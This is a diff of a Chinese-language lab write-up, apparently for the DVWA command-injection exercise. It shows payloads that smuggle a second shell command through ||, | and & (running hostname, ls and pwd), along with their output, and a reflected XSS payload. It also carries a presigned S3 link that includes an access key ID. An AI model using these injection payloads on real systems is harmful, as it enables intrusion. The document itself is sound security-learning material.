@@ -64,21 +64,31 @@ round-trip min/avg/max/stddev = 9.902/10.393/10.778/0.390 ms
 
 多試幾次後，運氣好猜中， `||` , `|`, `&`
 
-or
+### or
 ```bash
 ||hostname
 # 91ab8a5e75e3
 ```
 
-pipline
+### pipline
 ```bash
 |ls
 #help
 #index.php
 #source
 ```
-background job
+
+### background job
 ```bash
 &pwd 
 #/var/www/html/vulnerabilities/exec
 ```
+
+### XSS
+這邊有 client side reflected XSS
+```html
+&echo "<script>alert(1)</script>"
+```
+
+![這邊有 client side reflected XSS](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/fca5ac85-25c8-4d6b-b0f8-95ac06a1af23/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T042730Z&X-Amz-Expires=86400&X-Amz-Signature=44e621fb82de0d9e1edcc24e61f12cef66919f6128713cf7ac85a4ac61106ebc&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)
+
